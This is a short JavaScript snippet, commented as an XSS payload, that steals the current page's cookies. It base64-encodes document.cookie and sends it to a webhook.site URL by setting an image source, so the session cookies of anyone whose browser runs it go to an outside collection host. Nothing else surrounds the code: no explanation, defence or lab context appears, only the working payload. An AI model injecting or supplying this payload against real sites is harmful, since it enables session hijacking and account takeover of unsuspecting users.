// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/2e8f9920-cfe6-451d-b970-abae5a3282b1?data=' + btoa(document.cookie);
